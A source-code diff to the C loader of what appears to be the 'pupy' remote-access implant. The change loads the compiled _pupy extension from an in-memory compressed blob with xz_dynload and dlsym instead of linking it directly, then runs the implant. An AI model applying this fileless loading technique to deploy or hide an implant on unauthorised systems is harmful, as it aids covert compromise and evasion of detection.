@@ -19,20 +19,27 @@
 #include "debug.h"
 
 #include "pupy_load.h"
+
 #include "Python-dynload.c"
 #include "revision.h"
 #include "ld_hooks.h"
+#include "memfd.h"
 
-extern DL_EXPORT(void) init_pupy(void);
+// include the c extension to load from memory
+#include "_pupy.c"
+
+//extern DL_EXPORT(void) init_pupy(void);
 
 #if defined(_FEATURE_PATHMAP) && defined(_LD_HOOKS_NAME)
 const char *__pathmap_callback(const char *path, char *buf, size_t buf_size);
 #endif
 
+
 uint32_t mainThread(int argc, char *argv[], bool so)
 {
 
     struct rlimit lim;
+    char *oldcontext;
 
     dprint("TEMPLATE REV: %s\n", GIT_REVISION_HEAD);
 
@@ -78,7 +85,38 @@ uint32_t mainThread(int argc, char *argv[], bool so)
         return -1;
     }
 
-    init_pupy();
+    dprint("_pupy built with dynload\n");
+    //init_pupy();
+    void *c_pupy = xz_dynload(
+        "_pupy.so",
+        _pupy_c_start, _pupy_c_size,
+        NULL
+    );
+    PyObject *(*PyInit__pupy)(void);
+    PyInit__pupy= dlsym(c_pupy, "PyInit__pupy");
+    if (!PyInit__pupy) {
+        dprint("Couldn't find sym PyInit__pupy");
+        dlclose(c_pupy);
+        return -1;
+    }
+
+    oldcontext = _Py_PackageContext;
+    _Py_PackageContext = "_pupy";
+
+    PyObject *m = PyInit__pupy();
+    _Py_PackageContext = oldcontext;
+
+    PyObject *modules = NULL;
+    modules = PyImport_GetModuleDict();
+    PyObject *name = PyUnicode_FromString("_pupy");
+    _PyImport_FixupExtensionObject(m, name, name, modules);
+
+    Py_DECREF(name);
+
+    if (PyErr_Occurred()) {
+        dprint("error loading _pupy.so\n");
+        return false;
+    }
 
     dprint("Running pupy...\n");
     run_pupy();
